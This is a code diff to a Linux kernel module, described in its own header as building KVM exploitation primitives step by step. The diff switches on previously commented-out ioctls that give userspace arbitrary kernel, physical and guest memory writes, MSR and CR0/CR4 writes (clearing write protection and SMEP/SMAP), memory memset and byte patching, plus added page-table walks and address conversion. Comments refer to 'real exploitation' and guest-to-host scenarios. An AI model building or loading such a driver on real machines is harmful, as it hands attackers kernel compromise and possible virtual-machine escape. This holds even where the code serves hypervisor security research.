@@ -1,7 +1,7 @@
 /*
  * KVM Probe Driver - Core Infrastructure
  * Builds KVM exploitation primitives step by step
- * 
+ *
  * Step 1: Symbol Operations (Complete)
  * Step 2: Memory Read Operations (Complete)
  */
@@ -679,13 +679,13 @@ static inline unsigned long apply_kaslr(unsigned long unslid_addr)
 static unsigned long disable_wp(void)
 {
     unsigned long cr0 = native_read_cr0();
-    asm volatile("mov %0, %%cr0" : : "r"(cr0 & ~(1UL << 16)) : "memory");  /* Clear WP bit */
+    native_write_cr0(cr0 & ~(1UL << 16));  /* Clear WP bit */
     return cr0;
 }
 
 static void restore_wp(unsigned long cr0)
 {
-    asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
+    native_write_cr0(cr0);
 }
 
 /* Disable SMEP/SMAP temporarily */
@@ -776,7 +776,7 @@ static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, 
 
         mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
         if (!mapped) {
-            printk(KERN_DEBUG "%s: ioremap failed for phys 0x%lx\n", 
+            printk(KERN_DEBUG "%s: ioremap failed for phys 0x%lx\n",
                    DRIVER_NAME, phys_addr);
             return copied > 0 ? 0 : -EFAULT;
         }
@@ -839,7 +839,7 @@ static int read_guest_memory_gpa(unsigned long gpa, unsigned char *buffer, size_
      * 2. Locate the memslots for guest memory
      * 3. Translate GPA to HVA
      * 4. Read from HVA
-     * 
+     *
      * For now, we try physical memory read as a fallback
      * This works if guest physical memory is identity-mapped
      */
@@ -874,10 +874,10 @@ static int scan_memory_region(struct mem_region *region, struct mem_pattern *pat
         return -ENOMEM;
     }
 
-    for (current_addr = region->start; 
-         current_addr < region->end && found < max_results; 
+    for (current_addr = region->start;
+         current_addr < region->end && found < max_results;
          current_addr += region->step) {
-        
+
         size_t to_read = min(buffer_size, region->end - current_addr);
         int ret = 0;
 
@@ -906,10 +906,10 @@ static int scan_memory_region(struct mem_region *region, struct mem_pattern *pat
             for (i = 0; i <= to_read - pattern->pattern_len; i++) {
                 if (memcmp(scan_buffer + i, pattern->pattern, pattern->pattern_len) == 0) {
                     unsigned long found_addr = current_addr + i;
-                    
+
                     if (pattern->match_offset == -1 || pattern->match_offset == (int)i) {
                         printk(KERN_INFO "%s: Pattern found at 0x%lx\n", DRIVER_NAME, found_addr);
-                        
+
                         if (results && found < max_results) {
                             if (put_user(found_addr, results + found)) {
                                 kfree(scan_buffer);
@@ -972,24 +972,92 @@ static int find_pattern_in_range(unsigned long start, unsigned long end,
 
     kfree(scan_buffer);
     return -ENOENT;
-//}
-//
-//#ifdef CONFIG_X86
+}
+
+#ifdef CONFIG_X86
 /* Dump page table entries for a virtual address */
-//    return 0;
-//#endif
-/* Memory Write Implementations (Step 3)
+static int dump_page_tables(unsigned long virt_addr, struct page_table_dump *dump)
+{
+    pgd_t *pgd;
+    p4d_t *p4d;
+    pud_t *pud;
+    pmd_t *pmd;
+    pte_t *pte;
+    struct mm_struct *mm = current->mm;
+
+    if (!mm) {
+        mm = &init_mm;
+    }
+
+    dump->virtual_addr = virt_addr;
+    dump->pml4e = 0;
+    dump->pdpte = 0;
+    dump->pde = 0;
+    dump->pte = 0;
+    dump->physical_addr = 0;
+    dump->flags = 0;
+
+    pgd = pgd_offset(mm, virt_addr);
+    if (pgd_none(*pgd) || pgd_bad(*pgd)) {
+        return -EFAULT;
+    }
+    dump->pml4e = pgd_val(*pgd);
+
+    p4d = p4d_offset(pgd, virt_addr);
+    if (p4d_none(*p4d) || p4d_bad(*p4d)) {
+        return -EFAULT;
+    }
+
+    pud = pud_offset(p4d, virt_addr);
+    if (pud_none(*pud)) {
+        return -EFAULT;
+    }
+    dump->pdpte = pud_val(*pud);
+
+    if (pud_large(*pud)) {
+        /* 1GB page */
+        dump->physical_addr = (pud_val(*pud) & PUD_MASK) | (virt_addr & ~PUD_MASK);
+        dump->flags |= 0x01;  /* Large page flag */
+        return 0;
+    }
+
+    pmd = pmd_offset(pud, virt_addr);
+    if (pmd_none(*pmd)) {
+        return -EFAULT;
+    }
+    dump->pde = pmd_val(*pmd);
+
+    if (pmd_large(*pmd)) {
+        /* 2MB page */
+        dump->physical_addr = (pmd_val(*pmd) & PMD_MASK) | (virt_addr & ~PMD_MASK);
+        dump->flags |= 0x02;  /* Large page flag */
+        return 0;
+    }
+
+    pte = pte_offset_kernel(pmd, virt_addr);
+    if (pte_none(*pte)) {
+        return -EFAULT;
+    }
+    dump->pte = pte_val(*pte);
+    dump->physical_addr = (pte_val(*pte) & PAGE_MASK) | (virt_addr & ~PAGE_MASK);
+
+    return 0;
+}
+#endif
+
+/* ========================================================================
+ * Memory Write Implementations (Step 3)
  * ======================================================================== */
 
 /* Write to kernel memory - handles write protection bypass */
-static int write_kernel_memory(unsigned long addr, const unsigned char *buffer, 
+static int write_kernel_memory(unsigned long addr, const unsigned char *buffer,
                                 size_t size, int do_disable_wp)
 {
     unsigned long orig_cr0 = 0;
     int ret = 0;
 
     if (!is_kernel_address(addr)) {
-        printk(KERN_DEBUG "%s: Invalid kernel address for write: 0x%lx\n", 
+        printk(KERN_DEBUG "%s: Invalid kernel address for write: 0x%lx\n",
                DRIVER_NAME, addr);
         return -EINVAL;
     }
@@ -1001,17 +1069,22 @@ static int write_kernel_memory(unsigned long addr, const unsigned char *buffer,
     }
 #endif
 
-    /* Use memcpy for kernel memory writes (unsafe but for demo) */
-    memcpy((void *)addr, buffer, size);
-    ret = 0;
+    /* Try probe_kernel_write / copy_to_kernel_nofault */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 8, 0)
+    ret = copy_to_kernel_nofault((void *)addr, buffer, size);
+#else
+    ret = probe_kernel_write((void *)addr, buffer, size);
+#endif
 
+#ifdef CONFIG_X86
     if (do_disable_wp) {
         /* Restore write protection */
         restore_wp(orig_cr0);
     }
+#endif
 
     if (ret) {
-        printk(KERN_DEBUG "%s: write_kernel_memory failed at 0x%lx\n", 
+        printk(KERN_DEBUG "%s: write_kernel_memory failed at 0x%lx\n",
                DRIVER_NAME, addr);
         return -EFAULT;
     }
@@ -1023,7 +1096,7 @@ static int write_kernel_memory(unsigned long addr, const unsigned char *buffer,
 }
 
 /* Write to physical memory using ioremap */
-static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer, 
+static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer,
                                   size_t size)
 {
     void __iomem *mapped;
@@ -1058,7 +1131,7 @@ static int write_physical_memory(unsigned long phys_addr, const unsigned char *b
 }
 
 /* Write to physical memory via PFN and kmap */
-static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *buffer, 
+static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *buffer,
                                    size_t size)
 {
     unsigned long pfn = phys_addr >> PAGE_SHIFT;
@@ -1100,13 +1173,13 @@ static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *
 }
 
 /* Write to guest memory - for guest-to-host scenarios */
-static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer, 
+static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer,
                                    size_t size)
 {
     /*
      * In real exploitation, we would:
      * 1. Find KVM's internal structures
-     * 2. Locate guest memory mappings  
+     * 2. Locate guest memory mappings
      * 3. Translate GPA to HVA
      * 4. Write to HVA
      *
@@ -1119,7 +1192,7 @@ static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer
 }
 
 /* Write to guest memory via GFN */
-static int write_guest_memory_gfn(unsigned long gfn, const unsigned char *buffer, 
+static int write_guest_memory_gfn(unsigned long gfn, const unsigned char *buffer,
                                    size_t size)
 {
     unsigned long gpa = gfn << PAGE_SHIFT;
@@ -1166,8 +1239,8 @@ static int write_cr_register(int cr_num, unsigned long value, unsigned long mask
         case 0:
             current_val = native_read_cr0();
             new_val = (current_val & ~mask) | (value & mask);
-            asm volatile("mov %0, %%cr0" : : "r"(new_val) : "memory");
-            printk(KERN_INFO "%s: CR0: 0x%lx -> 0x%lx\n", 
+            native_write_cr0(new_val);
+            printk(KERN_INFO "%s: CR0: 0x%lx -> 0x%lx\n",
                    DRIVER_NAME, current_val, new_val);
             break;
         case 3:
@@ -1181,7 +1254,7 @@ static int write_cr_register(int cr_num, unsigned long value, unsigned long mask
         case 4:
             current_val = native_read_cr4();
             new_val = (current_val & ~mask) | (value & mask);
-            asm volatile("mov %0, %%cr4" : : "r"(new_val) : "memory");
+            native_write_cr4(new_val);
             printk(KERN_INFO "%s: CR4: 0x%lx -> 0x%lx\n",
                    DRIVER_NAME, current_val, new_val);
             break;
@@ -1410,7 +1483,72 @@ static int convert_phys_to_virt(unsigned long phys_addr, struct phys_to_virt_req
     return -EFAULT;
 }
 
-#ifdef NEVER
+/* Convert HVA to PFN via page table walk */
+static int convert_hva_to_pfn(unsigned long hva, struct hva_to_pfn_request *req)
+{
+    struct mm_struct *mm = current->mm;
+    pgd_t *pgd;
+    p4d_t *p4d;
+    pud_t *pud;
+    pmd_t *pmd;
+    pte_t *pte;
+    unsigned long pfn;
+
+    req->hva = hva;
+    req->pfn = 0;
+    req->status = -EFAULT;
+
+    if (!mm) {
+        mm = &init_mm;
+    }
+
+    down_read(&mm->mmap_lock);
+
+    pgd = pgd_offset(mm, hva);
+    if (pgd_none(*pgd) || pgd_bad(*pgd))
+        goto out;
+
+    p4d = p4d_offset(pgd, hva);
+    if (p4d_none(*p4d) || p4d_bad(*p4d))
+        goto out;
+
+    pud = pud_offset(p4d, hva);
+    if (pud_none(*pud))
+        goto out;
+
+    if (pud_large(*pud)) {
+        pfn = pud_pfn(*pud) + ((hva & ~PUD_MASK) >> PAGE_SHIFT);
+        req->pfn = pfn;
+        req->status = 0;
+        goto out;
+    }
+
+    pmd = pmd_offset(pud, hva);
+    if (pmd_none(*pmd))
+        goto out;
+
+    if (pmd_large(*pmd)) {
+        pfn = pmd_pfn(*pmd) + ((hva & ~PMD_MASK) >> PAGE_SHIFT);
+        req->pfn = pfn;
+        req->status = 0;
+        goto out;
+    }
+
+    pte = pte_offset_map(pmd, hva);
+    if (!pte || pte_none(*pte)) {
+        if (pte) pte_unmap(pte);
+        goto out;
+    }
+
+    pfn = pte_pfn(*pte);
+    req->pfn = pfn;
+    req->status = 0;
+    pte_unmap(pte);
+
+out:
+    up_read(&mm->mmap_lock);
+    return req->status;
+}
 
 /* Convert PFN to HVA (via direct map) */
 static int convert_pfn_to_hva(unsigned long pfn, unsigned long *hva)
@@ -1438,7 +1576,6 @@ static int convert_pfn_to_hva(unsigned long pfn, unsigned long *hva)
 
     return *hva ? 0 : -EFAULT;
 }
-#endif
 
 /* Simple GPA to GFN conversion */
 static inline unsigned long gpa_to_gfn_local(unsigned long gpa)
@@ -1594,7 +1731,7 @@ static int walk_ept_tables(unsigned long eptp, unsigned long gpa, struct ept_wal
 }
 
 /* Translate GVA through guest page tables */
-static int translate_gva_to_gpa(unsigned long gva, unsigned long cr3, 
+static int translate_gva_to_gpa(unsigned long gva, unsigned long cr3,
                                  struct gva_translate_request *req)
 {
     unsigned long pml4_base, pdpt_base, pd_base, pt_base;
@@ -1728,7 +1865,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 {
     int i, count;
 
-#if 0
     switch (cmd) {
         /* ================================================================
          * Step 1: Symbol Operations
@@ -2075,11 +2211,11 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
                 return -ENOMEM;
             }
 
-            found = scan_memory_region(&scan_req.region, &scan_req.pattern, 
+            found = scan_memory_region(&scan_req.region, &scan_req.pattern,
                                         results_buf, max_results);
 
             if (found > 0 && scan_req.region.buffer) {
-                size_t to_copy = min((size_t)(found * sizeof(unsigned long)), 
+                size_t to_copy = min((size_t)(found * sizeof(unsigned long)),
                                      scan_req.region.buffer_size);
                 if (copy_to_user(scan_req.region.buffer, results_buf, to_copy)) {
                     kfree(results_buf);
@@ -2103,7 +2239,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
                 return -EINVAL;
             }
 
-            ret = find_pattern_in_range(req.start, req.end, req.pattern, 
+            ret = find_pattern_in_range(req.start, req.end, req.pattern,
                                          req.pattern_len, &req.found_addr, 1);
 
             if (ret == 0) {
@@ -2147,7 +2283,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
         }
 
-        /*
         case IOCTL_DUMP_PAGE_TABLES: {
             struct page_table_dump dump;
 
@@ -2161,7 +2296,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 
             return copy_to_user((void __user *)arg, &dump, sizeof(dump)) ? -EFAULT : 0;
         }
-        */
 #endif
 
         case IOCTL_GET_KASLR_INFO: {
@@ -2197,7 +2331,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
          * Step 3: Memory Write Operations
          * ================================================================ */
 
-        /*
         case IOCTL_WRITE_KERNEL_MEM: {
             struct kernel_mem_write req;
             unsigned char *kbuf;
@@ -2211,7 +2344,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
                 return -EINVAL;
             }
 
-            if (req.length > 1024 * 1024) { // Limit to 1MB
+            if (req.length > 1024 * 1024) {  /* Limit to 1MB */
                 return -EINVAL;
             }
 
@@ -2229,9 +2362,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             kfree(kbuf);
             return ret;
         }
-        */
 
-        /*
         case IOCTL_WRITE_PHYSICAL_MEM: {
             struct physical_mem_write req;
             unsigned char *kbuf;
@@ -2263,162 +2394,161 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             kfree(kbuf);
             return ret;
         }
-//        */
-//
-//        case IOCTL_WRITE_PHYSICAL_PFN: {
-//            struct physical_mem_write req;
-//            unsigned char *kbuf;
-//            int ret;
-//
-//            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
-//                return -EFAULT;
-//            }
-//
-//            if (!req.length || !req.user_buffer) {
-//                return -EINVAL;
-//            }
-//
-//            if (req.length > 1024 * 1024) {
-//                return -EINVAL;
-//            }
-//
-//            kbuf = kmalloc(req.length, GFP_KERNEL);
-//            if (!kbuf) {
-//                return -ENOMEM;
-//            }
-//
-//            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
-//                kfree(kbuf);
-//                return -EFAULT;
-//            }
-//
-//            ret = write_physical_via_pfn(req.phys_addr, kbuf, req.length);
-//            kfree(kbuf);
-//            return ret;
-//        }
-//
-//        case IOCTL_WRITE_GUEST_MEM: {
-//            struct guest_mem_write req;
-//            unsigned char *kbuf;
-//            int ret;
-//
-//            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
-//                return -EFAULT;
-//            }
-//
-//            if ((!req.gpa && !req.gva) || !req.length || !req.user_buffer) {
-//                return -EINVAL;
-//            }
-//
-//            if (req.length > 1024 * 1024) {
-//                return -EINVAL;
-//            }
-//
-//            kbuf = kmalloc(req.length, GFP_KERNEL);
-//            if (!kbuf) {
-//                return -ENOMEM;
-//            }
-//
-//            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
-//                kfree(kbuf);
-//                return -EFAULT;
-//            }
-//
-//            switch (req.mode) {
-//                case 0:  /* GPA */
-//                    ret = write_guest_memory_gpa(req.gpa, kbuf, req.length);
-//                    break;
-//                case 1:  /* GVA - not implemented */
-//                    printk(KERN_WARNING "%s: GVA write not implemented\n", DRIVER_NAME);
-//                    ret = -ENOSYS;
-//                    break;
-//                case 2:  /* GFN */
-//                    ret = write_guest_memory_gfn(req.gpa, kbuf, req.length);
-//                    break;
-//                default:
-//                    ret = -EINVAL;
-//            }
-//
-//            kfree(kbuf);
-//            return ret;
-//        }
+
+        case IOCTL_WRITE_PHYSICAL_PFN: {
+            struct physical_mem_write req;
+            unsigned char *kbuf;
+            int ret;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (!req.length || !req.user_buffer) {
+                return -EINVAL;
+            }
+
+            if (req.length > 1024 * 1024) {
+                return -EINVAL;
+            }
+
+            kbuf = kmalloc(req.length, GFP_KERNEL);
+            if (!kbuf) {
+                return -ENOMEM;
+            }
+
+            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
+                kfree(kbuf);
+                return -EFAULT;
+            }
+
+            ret = write_physical_via_pfn(req.phys_addr, kbuf, req.length);
+            kfree(kbuf);
+            return ret;
+        }
+
+        case IOCTL_WRITE_GUEST_MEM: {
+            struct guest_mem_write req;
+            unsigned char *kbuf;
+            int ret;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if ((!req.gpa && !req.gva) || !req.length || !req.user_buffer) {
+                return -EINVAL;
+            }
+
+            if (req.length > 1024 * 1024) {
+                return -EINVAL;
+            }
+
+            kbuf = kmalloc(req.length, GFP_KERNEL);
+            if (!kbuf) {
+                return -ENOMEM;
+            }
+
+            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
+                kfree(kbuf);
+                return -EFAULT;
+            }
+
+            switch (req.mode) {
+                case 0:  /* GPA */
+                    ret = write_guest_memory_gpa(req.gpa, kbuf, req.length);
+                    break;
+                case 1:  /* GVA - not implemented */
+                    printk(KERN_WARNING "%s: GVA write not implemented\n", DRIVER_NAME);
+                    ret = -ENOSYS;
+                    break;
+                case 2:  /* GFN */
+                    ret = write_guest_memory_gfn(req.gpa, kbuf, req.length);
+                    break;
+                default:
+                    ret = -EINVAL;
+            }
+
+            kfree(kbuf);
+            return ret;
+        }
 
 #ifdef CONFIG_X86
-//        case IOCTL_WRITE_MSR: {
-//            struct msr_write_request req;
-//
-//            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
-//                return -EFAULT;
-//            }
-//
-//            return write_msr_safe(req.msr, req.value);
-//        }
-//
-//        case IOCTL_WRITE_CR_REGISTER: {
-//            struct cr_write_request req;
-//
-//            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
-//                return -EFAULT;
-//            }
-//
-//            if (req.cr_num < 0 || req.cr_num > 4 || req.cr_num == 1 || req.cr_num == 2) {
-//                return -EINVAL;
-//            }
-//
-//            return write_cr_register(req.cr_num, req.value, req.mask);
-//        }
+        case IOCTL_WRITE_MSR: {
+            struct msr_write_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            return write_msr_safe(req.msr, req.value);
+        }
+
+        case IOCTL_WRITE_CR_REGISTER: {
+            struct cr_write_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (req.cr_num < 0 || req.cr_num > 4 || req.cr_num == 1 || req.cr_num == 2) {
+                return -EINVAL;
+            }
+
+            return write_cr_register(req.cr_num, req.value, req.mask);
+        }
 #endif
 
-//        case IOCTL_MEMSET_KERNEL: {
-//            struct memset_request req;
-//
-//            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
-//                return -EFAULT;
-//            }
-//
-//            if (!req.addr || !req.length) {
-//                return -EINVAL;
-//            }
-//
-//            if (req.length > 1024 * 1024) {
-//                return -EINVAL;
-//            }
-//
-//            return memset_kernel_memory(req.addr, req.value, req.length);
-//        }
-//
-//        case IOCTL_MEMSET_PHYSICAL: {
-//            struct memset_request req;
-//
-//            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
-//                return -EFAULT;
-//            }
-//
-//            if (!req.length) {
-//                return -EINVAL;
-//            }
-//
-//            if (req.length > 1024 * 1024) {
-//                return -EINVAL;
-//            }
-//
-//            return memset_physical_memory(req.addr, req.value, req.length);
-//        }
-//
-//        case IOCTL_PATCH_BYTES: {
-//            struct patch_request req;
-//
-//            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
-//                return -EFAULT;
-//            }
-//
-//            if (!req.addr || req.length == 0 || req.length > 32) {
-//                return -EINVAL;
-//            }
-//
-//            return patch_memory(req.addr, req.original, req.patch, req.length,
-//                               req.verify_original, req.addr_type);
-//        }
+        case IOCTL_MEMSET_KERNEL: {
+            struct memset_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (!req.addr || !req.length) {
+                return -EINVAL;
+            }
+
+            if (req.length > 1024 * 1024) {
+                return -EINVAL;
+            }
+
+            return memset_kernel_memory(req.addr, req.value, req.length);
+        }
+
+        case IOCTL_MEMSET_PHYSICAL: {
+            struct memset_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (!req.length) {
+                return -EINVAL;
+            }
+
+            if (req.length > 1024 * 1024) {
+                return -EINVAL;
+            }
+
+            return memset_physical_memory(req.addr, req.value, req.length);
+        }
+
+        case IOCTL_PATCH_BYTES: {
+            struct patch_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (!req.addr || req.length == 0 || req.length > 32) {
+                return -EINVAL;
+            }
+
+            return patch_memory(req.addr, req.original, req.patch, req.length,
+                               req.verify_original, req.addr_type);
+        }
 
         /* ================================================================
          * Step 4: Address Conversion Operations
@@ -2448,7 +2578,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
         }
 
-        /*
         case IOCTL_HVA_TO_PFN: {
             struct hva_to_pfn_request req;
 
@@ -2460,18 +2589,17 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 
             return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
         }
-        */
-//        
-//        case IOCTL_PFN_TO_HVA: {
-//            struct addr_conv_request req;
-//
-//            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
-//                return -EFAULT;
-//            }
-//
-//            req.status = convert_pfn_to_hva(req.input_addr, &req.output_addr);
-//
-//            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
+
+        case IOCTL_PFN_TO_HVA: {
+            struct addr_conv_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            req.status = convert_pfn_to_hva(req.input_addr, &req.output_addr);
+
+            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
         }
 
         case IOCTL_VIRT_TO_PFN: {
@@ -2673,8 +2801,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 
         default:
             return -ENOTTY;
-#endif
-    return -ENOTTY;
     }
 
     return 0;
@@ -2717,7 +2843,7 @@ static int __init mod_init(void)
     /* Initialize kallsyms lookup for newer kernels */
     ret = kallsyms_lookup_init();
     if (ret < 0) {
-        printk(KERN_WARNING "%s: kallsyms lookup init failed, some features disabled\n", 
+        printk(KERN_WARNING "%s: kallsyms lookup init failed, some features disabled\n",
                DRIVER_NAME);
     }
 
@@ -2762,7 +2888,7 @@ static int __init mod_init(void)
 
     printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d\n",
            DRIVER_NAME, DEVICE_FILE_NAME, major_num);
-    printk(KERN_INFO "%s: Found %d KVM symbols, KASLR slide: 0x%lx\n", 
+    printk(KERN_INFO "%s: Found %d KVM symbols, KASLR slide: 0x%lx\n",
            DRIVER_NAME, kvm_symbol_count, g_kaslr_slide);
 
     return 0;
